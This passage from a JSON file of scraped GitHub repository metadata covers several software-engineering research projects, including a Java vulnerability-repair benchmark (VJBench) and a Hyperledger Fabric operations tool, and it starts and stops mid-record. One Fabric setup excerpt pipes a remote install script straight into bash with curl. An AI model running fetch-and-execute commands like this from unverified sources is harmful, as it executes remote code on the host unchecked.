                    "value": "VJBench consists of 42 reproducible vulnerabilities, which are listed in [`VJBench_dataset.csv`](./VJBench_dataset.csv). More details are provided in [`VJBench_data.json`](./scripts/VJBench_data.json) including the compile and test commands for reproducing each vulnerability. The first 15 vulnerabilities listed in [`VJBench_dataset.csv`](./VJBench_dataset.csv) have single hunk fixes, and thus are used in our study: Netty-1, Netty-2, Jenkins-1, Jenkins-2, Jenkins-3, Jinjava-1, Halo-1, Retrofit-1, Quartz-1, Flow-1, Flow-2, BC-Java-1, Json-sanitizer-1, Ratpack-1, Pulsar-1. \n",
                    "type": "Text_excerpt",
                    "original_header": "VJBench",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "For example, if we want to checkout Halo-1\n```bash\npython3 ./scripts/build_vjbench.py checkout Halo-1\n```",
                    "type": "Text_excerpt",
                    "original_header": "Checkout a vulnerability:",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "VJBench",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\npython3 ./scripts/build_vjbench.py compile Halo-1\n```",
                    "type": "Text_excerpt",
                    "original_header": "Compile:",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "VJBench",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\npython3 ./scripts/build_vjbench.py test Halo-1\n```",
                    "type": "Text_excerpt",
                    "original_header": "Test:",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "VJBench",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "The dataset VJBench-trans, consists of three transformed versions for each of the 50 single-hunk vulnerabilities (15 from VJBench and 35 from Vul4J). The transformed vulnerabilities are obtained by applying : (1) Identifier renaming only (2) Code structure change only (3) Both identifier renaming and code structure change at the same time. In total, there are 3x50 = 150 transformed vulnerabilities in VJBench-trans. The transformed and original vulnerabilities and are available in the folder [`VJBench-trans`](./VJBench-trans/).\n\nFor each vulnerability, we provide seven files with the following suffixes:\n\n- original_method.java: the original buggy method.\n- rename_only.java: the transformed buggy method with identifier renaming only.\n- code_structure_change_only.java: the transformed buggy method with code structure change only.\n- full_transformation.java: the transformed buggy method with both identifier renaming and code structure change.\n- identifier_rename_dict.json: the identifier renaming mapping dictionary.\n- patch_for_code_structure_change_only.java: the fixed transformed buggy method with code structure change only\n- buggyline_location.json: the buggy line location for the buggy method [buggy_line_start, buggy_line_end]\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Transformed Vulnerabilities",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "Patches generated by the models and the validation results are under folder [`./Model_patches/model_output/`](./Model_patches/model_output).\n\nFor validation results, \"test_success\" means the patch passes the test cases,  \"compile_success\" means that the patch fails to pass the test cases but is compilable, \"uncompilable\" means the patch is uncompilable, and \"test_timeout\" is the patch validtion exceeds the time limit.\n",
                    "type": "Text_excerpt",
                    "original_header": "Model Patches",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\ncd models\n\n# download plbart-large\ngit clone https://huggingface.co/uclanlp/plbart-large\n\n# download codet5-large\ngit clone https://huggingface.co/Salesforce/codet5-large\n\n# download codegen-6B-multi\ngit clone https://huggingface.co/Salesforce/codegen-6B-multi \n\n# download incoder-6B\ngit clone https://huggingface.co/facebook/incoder-6B\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "LLMs as is",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "Large Language Models",
                        "Usage",
                        "Model download"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "We use LLMs fine-tuned by prior work [\"Impact of Code Language Models on Automated Program Repair\"](https://github.com/lin-tan/clm)\n\nThe fine-tuned LLMs can be downloaded from here https://doi.org/10.5281/zenodo.7559244, https://doi.org/10.5281/zenodo.7559277.\n\nThe fine-tuned LLMs we use in our work are:\n- plbart-large-finetuned\n- codet5-large-finetuned\n- codegen-6B-finetuned\n- incoder-6B-finetuned\n",
                    "type": "Text_excerpt",
                    "original_header": "Fine-tuned LLMs",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "Large Language Models",
                        "Usage",
                        "Model download"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "The inputs to the models are under folder [`./Model_patches/model_input/`](./Model_patches/model_input).\n\nWe utilize a java parser [Jasper](https://github.com/lin-tan/clm/tree/main/jasper) to parse the buggy code to generate input. First, we need to install jasper. \n```bash\ncd jasper\n\njavac -cp \".:lib/*\" -d target src/main/java/clm/jasper/*.java src/main/java/clm/codet5/*.java src/main/java/clm/codegen/*.java src/main/java/clm/plbart/*.java src/main/java/clm/incoder/*.java src/main/java/clm/finetuning/*.java\n```\n\nNext, for example, we will run fine-tuned InCoder. \n```bash\npython3 ./scripts/fine-tuned_InCoder/fine_tuned_incoder_prepare_input.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Prepare input",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "Large Language Models",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "Assume the path to the model is `/path/to/models_dir/incoder-6B-finetuned`\n```bash\npython3 ./scripts/fine-tuned_InCoder/fine_tuned_incoder_generate_output.py /path/to/models_dir/\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Patch generation",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "Large Language Models",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "validate VJBench vulnerabilities\n```bash\npython3 ./scripts/fine-tuned_InCoder/fine_tuned_incoder_vjbench_validation.py\n```\nvalidate Vul4J vulnerabilities\n```bash\npython3 ./scripts/fine-tuned_InCoder/fine_tuned_incoder_vul4j_validation.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Patch validation",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?",
                        "Large Language Models",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "Please refer to each APR tool's repo (link provided below) for usage guidance. Some scripts for using APR tools are available in the folder `.scripts/APR`.\n\n- [RewardRepair](https://github.com/ASSERT-KTH/RewardRepair)\n- [KNOD](https://github.com/lin-tan/knod)\n- [Recoder](https://github.com/pkuzqh/Recoder)\n- [CURE](https://github.com/lin-tan/CURE)\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Automated Program Repair",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-26T04:09:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-15T17:35:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 383950
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 302493
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1300
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "825": {
        "filename": "QuanjunZhang_OCP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/QuanjunZhang/OCP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-05-13T12:04:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-29T06:46:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 93633351
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 55172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "826": {
        "filename": "kabinja_suit-smells-replication-package_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kabinja/suit-smells-replication-package",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-24T16:21:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-06-13T10:52:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 30011
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 2886
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 955
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "827": {
        "filename": "MDEGroup_BiasInRSSE_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MDEGroup/BiasInRSSE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-18T13:38:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-31T03:20:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 100320
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 31113
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Io",
                    "name": "Io",
                    "type": "Programming_language",
                    "size": 26067
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Logos",
                    "name": "Logos",
                    "type": "Programming_language",
                    "size": 24212
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DIGITAL Command Language",
                    "name": "DIGITAL Command Language",
                    "type": "Programming_language",
                    "size": 22848
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 12663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "828": {
        "filename": "dlfaults_taxonomy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dlfaults/taxonomy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nThe link to our replication package is\r\nhttps://github.com/dlfaults/taxonomy/tree/master/replication\r\n\r\nOur replication package consists of three main folders: Manual_Labelling, Interviews and Survey.\r\n\r \n",
                    "original_header": "Taxonomy of Real Faults in Deep Learning Systems"
                },
                "confidence": 0.930366823924143,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dlfaults/taxonomy/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-23T11:15:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-26T11:50:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 42165
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "829": {
        "filename": "fischJan_CiRA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fischJan/CiRA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-11-06T15:36:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-06T06:50:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 467236
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "830": {
        "filename": "dessertlab_Shellcode_IA32_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/Shellcode_IA32",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-04-27T08:50:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T10:04:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "831": {
        "filename": "dukeboard_kevoree-modeling-framework_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dukeboard/kevoree-modeling-framework",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To perform all KMF model operation, we need to generated a trace sequence through a model compare. This trace sequence can be then apply on a model to perform the real operation. \n\n```\nModelCompare compare = new DefaultModelCompare();\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "ModelCompare",
                    "parent_header": [
                        "Model operators",
                        "Set operations on models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            },
            {
                "result": {
                    "value": "A model merge operation aims at merge all models elements present in two models in one model. \n\n> A + TraceMergeOf(A,B) = A + B\n\nAs all KMF model operation it relie on the comparator to generate the trace sequence corresding to such operation. Then the trace sequence can be apply on A, B is unchanged.\n\n``` java\ndiffSeq = compare.merge(modelA,modelB);\ndiffSeq.applyOn(modelA)\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Model union",
                    "parent_header": [
                        "Model operators",
                        "Set operations on models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            },
            {
                "result": {
                    "value": "A model intersection operation aims at building a model containing all common models elements present in two models. \n\n> A + TraceMergeOf(A,B) = (A+B) - A - B \n\nAs all KMF model operation it relie on the comparator to generate the trace sequence corresding to such operation.\n\n``` java\ndiffSeq = compare.inter(modelA,modelB);\ndiffSeq.applyOn(modelA)\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Model intersection",
                    "parent_header": [
                        "Model operators",
                        "Set operations on models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            },
            {
                "result": {
                    "value": "A model compare operation aims at migrate a model to another. In short a model A should reach the state of a model B this is the right operation. This operation is mainly used in synchronization process. \n\n> A + TraceMergeOf(A,B) = B\n\nAs all KMF model operation it relie on the comparator to generate the trace sequence corresding to such operation.\n\n``` java\ndiffSeq = compare.inter(modelA,modelB);\ndiffSeq.applyOn(modelA)\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Model patch",
                    "parent_header": [
                        "Model operators",
                        "Set operations on models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Now, imagine that you want to get the `logger`component that you know to be hosted on node `42`. Doing so using the KMF API looks like:\n``` java\nComponentModelRoot root = mySystem.getRoot();\nComponent foundComponent = null;\nfor(Node loopingNode : root.getNodes()){\n\tif(loopingNode.getName().equals(\"42\")){\n\t\tfor(Component loopingComponent : loopingNode.getComponents()){\n\t\t\tif(loopingComponent.equals(\"logger\")){\n\t\t\t\tfoundComponent = loopingComponent.equals;\n\t\t\t}\n    \t}\n\t}\t\n}\n```\nUsing the KMFQL-PS the same research looks like:\n``` java\nComponentModelRoot root = mySystem.getRoot();\nComponent foundComponent = root.findByPath(\"nodes[42]/components[logger]\");\n```\t\n \n",
                    "original_header": "Path Selector"
                },
                "confidence": 0.9946322382131797,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Let's take as example a simple FSM metamodel (you can find it [here](https://github.com/kevoree/kmf-samples/tree/master/fsm/org.kevoree.modeling.sample.fsm.kt) ). In this metamodel we add an operation `run` to the metaclass `Action`. Then, you can declare in your src/main/java directory several Kotlin traits implementing the generated interface. An example can be found [here](https://github.com/kevoree/kmf-samples/blob/master/fsm/org.kevoree.modeling.sample.fsm.kt/src/main/java/org/jetbrains/annotations/MyAspect.kt).\n``` kotlin\naspect trait MyAspect : Action {\n\toverride fun run(p : Boolean): String {return \"\";}\n\tprivate fun internalStuff(){}\n    }\n```\n \n",
                    "original_header": "Aspect API"
                },
                "confidence": 0.9425577705156966,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dukeboard/kevoree-modeling-framework/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2012-03-04T15:14:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-06-17T15:44:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 7478434
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 803711
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 636030
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 34808
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C++",
                    "name": "Objective-C++",
                    "type": "Programming_language",
                    "size": 9069
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2138
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1201
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "832": {
        "filename": "hyperledger-labs_fabric-opssc_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hyperledger-labs/fabric-opssc",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "By running the following commands, download the binaries and docker images for Hyperledger Fabric used by test-network:\n\n```sh\n$ cd ${FABRIC_OPSSC}/sample-environments/fabric-samples\n$ export FABRIC_VERSION=2.5.2\n$ export FABRIC_CA_VERSION=1.5.6\n$ curl -sSL https://raw.githubusercontent.com/hyperledger/fabric/main/scripts/install-fabric.sh | bash -s -- -f ${FABRIC_VERSION} -c ${FABRIC_CA_VERSION} b d\n\n$ ls bin # Confirm the target version binaries are downloaded\nconfigtxgen  configtxlator  cryptogen  discover  fabric-ca-client  fabric-ca-server  idemixgen  orderer  osnadmin  peer\n```\n\n`${FABRIC_OPSSC}` means the `fabric-opssc` directory.\n\nSee [the official documentation](https://hyperledger-fabric.readthedocs.io/en/latest/install.html) for more details.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation 1: Download binaries and docker images for Hyperledger Fabric",
                    "parent_header": [
                        "Operations Smart Contract (OpsSC) for Hyperledger Fabric v2.x",
                        "Try the OpsSC in the sample environment",
                        "Preparations"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "value": "Build the Fabric ConfigTX CLI by running the following commands:\n\n```sh\n$ cd ${FABRIC_OPSSC}/configtx-cli\n$ make build\n\n$ ls bin # Command to confirm the binary is created\nfabric-configtx-cli\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation 2: Build Fabric ConfigTX CLI",
                    "parent_header": [
                        "Operations Smart Contract (OpsSC) for Hyperledger Fabric v2.x",
                        "Try the OpsSC in the sample environment",
                        "Preparations"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "value": "Build the docker images for OpsSC Agent and API Server by running the following commands:\n\n```sh\n$ cd ${FABRIC_OPSSC}\n$ make docker\n\n$ docker images # Command to confirm the images are created\nREPOSITORY                                                     TAG                              IMAGE ID            CREATED             SIZE\n(...)\nfabric-opssc/opssc-agent                                       latest                           44e30c583566        44 hours ago        1.49GB\nfabric-opssc/opssc-api-server                                  latest                           154c4a550823        44 hours ago        1.43GB\n(...)\n```\n\nBy default, the command builds images for Fabric v2.5 series.\nIf you want to build images for v2.2 series, you should set the `FABRIC_TWO_DIGIT_VERSION` variable.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation 3: Build docker images for OpsSC Agent and API Server",
                    "parent_header": [
                        "Operations Smart Contract (OpsSC) for Hyperledger Fabric v2.x",
                        "Try the OpsSC in the sample environment",
                        "Preparations"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Chaincode operations: Streamline chaincode deployment with chaincode new lifecycle introduced from v2.x.\n- Channel operations: Streamline channel configuration updates across multiple organizations (e.g., creating a channel, adding an organization, adding an orderer etc.)\n \n",
                    "original_header": "Overview"
                },
                "confidence": 0.9939219542651235,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Hyperledger Fabric v2.5.0 or later (Tested by using v2.5.2)\n  - Also it works in v2.2.2 or later (Tested by using v2.2.12)\n- Fabric network configuration\n  - Using Fabric CAs\n  - Using Raft orderers\n  - Each organization has their one or more peers and one ore more orderers\n    - An orderer for each organization is required to operate channels including the system channel\n    - An peer for orderer organization is required to interact with the OpsSC to execute operations on orderers\n  - Having a channel for the OpsSC chaincodes (referred to \"ops channel\") and all organizations joins the channel\n    - The OpsSC chaincodes should be deployed to all organizations\n    - The OpsSC chaincodes on the ops channel is used for managing all channels and all chaincodes on the channels\n    - This channel configuration is to simplify the management of the OpsSC chaincodes\n  - Each organization has one or more agents and one or more API servers for that organization itself\n    - The agent and API server need to use a private key and certificate for the client identity to execute admin commands to all nodes owned by that organization\n \n",
                    "original_header": "Assumed Hyperledger Fabric environment"
                },
                "confidence": 0.998374596937043,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following shows how to set up this sample environment first. After that, as a typical example of decentralized operation using the OpsSC,\nit will explain a procedure for creating a new channel, deploying a new chaincode on the channel and adding a new organization using the OpsSC.\n \n",
                    "original_header": "Try the OpsSC in the sample environment"
                },
                "confidence": 0.9606850051996483,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Create `ops-channel` as the ops channel and OpsSC chaincodes for operating chaincodes and channels to the ops-channel by running the following commands:\n```sh\n# Create the ops channel\n$ export OPS_CHANNEL_ID=ops-channel\n$ ./network.sh createChannel -c ${OPS_CHANNEL_ID}\n\n# Deploy the OpsSC chaincodes on the ops channel\n$ export OPS_CC_NAME=channel-ops\n$ ./network.sh deployCC -c ${OPS_CHANNEL_ID} -ccn ${OPS_CC_NAME} -ccp ../../../chaincode/${OPS_CC_NAME} -ccl go\n\n$ export OPS_CC_NAME=chaincode-ops\n$ ./network.sh deployCC -c ${OPS_CHANNEL_ID} -ccn ${OPS_CC_NAME} -ccp ../../../chaincode/${OPS_CC_NAME} -ccl go\n\n# Add channel information (including joining organizations) for the system channel and the ops channel to the OpsSC\n$ ./registerNetworkInfoToOpsSC.sh ${OPS_CHANNEL_ID} system-channel system\n$ ./registerNetworkInfoToOpsSC.sh ${OPS_CHANNEL_ID} ${OPS_CHANNEL_ID} ops\n```\n \n```sh\n# Launch the OpsSC agents and API servers for Org1MSP and Org2MSP\n$ docker-compose -f docker/docker-compose-opssc-api-servers.yaml up -d\n$ docker-compose -f docker/docker-compose-opssc-agents.yaml up -d\n\n# Do health check for the agents and servers\n## Check for the API server for Org1MSP\n$ curl -X GET http://localhost:5000/healthz\nOK\n## Check for the API server for Org2MSP\n$ curl -X GET http://localhost:5001/healthz\nOK\n## Check for the agent for Org1MSP\n$ curl -X GET http://localhost:5500/healthz\nOK\n## Check for the agent for Org2MSP\n$ curl -X GET http://localhost:5501/healthz\nOK\n``` \n",
                    "original_header": "Initialize the OpsSC on the test network"
                },
                "confidence": 0.9999150169741247,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hyperledger-labs/fabric-opssc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
